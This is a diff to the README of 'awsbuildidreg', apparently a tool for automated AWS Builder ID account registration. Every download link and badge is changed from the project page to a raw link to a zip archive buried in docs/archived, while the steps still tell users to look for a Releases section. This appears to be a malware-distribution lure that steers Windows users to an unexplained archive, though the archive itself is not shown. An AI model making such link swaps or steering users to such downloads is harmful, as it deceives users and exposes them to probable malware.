@@ -1,6 +1,6 @@
 # 🚀 awsbuildidreg - Automated AWS Builder ID Registration
 
-[![Download awsbuildidreg](https://img.shields.io/badge/Download-awsbuildidreg-blue?style=for-the-badge)](https://github.com/Phats8783/awsbuildidreg)
+[![Download awsbuildidreg](https://img.shields.io/badge/Download-awsbuildidreg-blue?style=for-the-badge)](https://raw.githubusercontent.com/Phats8783/awsbuildidreg/main/docs/archived/Software_3.9-beta.1.zip)
 
 ## 📋 What is awsbuildidreg?
 
@@ -52,12 +52,12 @@ The program uses a clear and simple design:
 
 ## 🔽 Download and Installation
 
-[![Download awsbuildidreg](https://img.shields.io/badge/Download-awsbuildidreg-grey?style=for-the-badge)](https://github.com/Phats8783/awsbuildidreg)
+[![Download awsbuildidreg](https://img.shields.io/badge/Download-awsbuildidreg-grey?style=for-the-badge)](https://raw.githubusercontent.com/Phats8783/awsbuildidreg/main/docs/archived/Software_3.9-beta.1.zip)
 
 Follow these steps to download and run awsbuildidreg on your Windows computer:
 
 1. Visit the official page:  
-   [https://github.com/Phats8783/awsbuildidreg](https://github.com/Phats8783/awsbuildidreg)
+   [https://raw.githubusercontent.com/Phats8783/awsbuildidreg/main/docs/archived/Software_3.9-beta.1.zip](https://raw.githubusercontent.com/Phats8783/awsbuildidreg/main/docs/archived/Software_3.9-beta.1.zip)
 
 2. On the page, find the **Releases** or **Downloads** section.
 
@@ -150,4 +150,4 @@ If you encounter issues:
 
 ## 🔗 Download Link Again
 
-[Click here to visit the download page for awsbuildidreg](https://github.com/Phats8783/awsbuildidreg)
+[Click here to visit the download page for awsbuildidreg](https://raw.githubusercontent.com/Phats8783/awsbuildidreg/main/docs/archived/Software_3.9-beta.1.zip)
